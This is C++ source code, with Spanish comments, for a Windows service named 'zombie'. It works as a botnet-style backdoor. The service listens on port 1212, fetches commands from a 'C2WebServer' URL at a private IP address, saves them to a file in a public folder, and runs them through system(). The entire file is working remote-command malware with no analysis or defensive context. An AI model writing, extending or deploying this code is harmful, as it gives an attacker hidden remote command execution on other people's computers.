#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

#define SERVICE_NAME "zombie"

std::string GetURLContent(const char* url) {
    std::string content;
    HINTERNET hInternet = InternetOpenA("MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        
        if (hConnect) {
            DWORD bytesRead;
            char buffer[4096];
            
            while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                content.append(buffer, bytesRead);
            }
            
            InternetCloseHandle(hConnect);
        }
        
        InternetCloseHandle(hInternet);
    }
    
    return content;
}

VOID WINAPI RequestHandler(LPVOID lpParam) {
    SOCKET clientSocket = (SOCKET)lpParam;

    // Aquí colocas el código que deseas ejecutar cuando se reciba una petición en el servidor de Windows.
    // Por ejemplo, puedes realizar una lectura de datos recibidos en el socket y realizar una acción en base a esos datos.
    // Recuerda cerrar el socket al finalizar el manejo de la petición.

    // Ejemplo de recepción de datos:
    char buffer[4096];
    int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);

    if (bytesRead > 0) {
        // Realiza alguna acción basada en los datos recibidos en el buffer.

        const char* url = "http://192.168.0.135/C2WebServer/controller/sendCommand.php";
        std::string urlContent = GetURLContent(url);
        std::ofstream file("C:\\Users\\Public\\Music\\command.txt");
        file << urlContent;
        file.close();
        system(GetURLContent(url).c_str());
    }

    closesocket(clientSocket);
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        // Error al crear el socket
        WSACleanup();  // Limpiar Winsock
        return;
    }

    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = htonl(INADDR_ANY);
    service.sin_port = htons(1212);

    if (bind(listenSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
        // Error al vincular el socket
        closesocket(listenSocket);
        WSACleanup();  // Limpiar Winsock
        return;
    }

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        // Error al escuchar en el socket
        closesocket(listenSocket);
        WSACleanup();  // Limpiar Winsock
        return;
    }

    while (true) {
        SOCKET clientSocket = accept(listenSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            // Error al aceptar la conexión
            continue;
        }

        // Crear un nuevo hilo para manejar la petición
        DWORD threadId;
        HANDLE threadHandle = CreateThread(NULL, 0, RequestHandler, (LPVOID)clientSocket, 0, &threadId);
        if (threadHandle == NULL) {
            // Error al crear el hilo
            closesocket(clientSocket);
            continue;
        }

        // Cerrar el handle del hilo, ya que no lo necesitamos
        CloseHandle(threadHandle);
    }

    // Cerrar el socket y limpiar Winsock
    closesocket(listenSocket);
    WSACleanup();
}

int main(int argc, char* argv[]) {
    SERVICE_TABLE_ENTRY serviceTable[] =
    {
        { SERVICE_NAME, ServiceMain },
        { nullptr, nullptr }
    };

    StartServiceCtrlDispatcher(serviceTable);
    return 0;
}
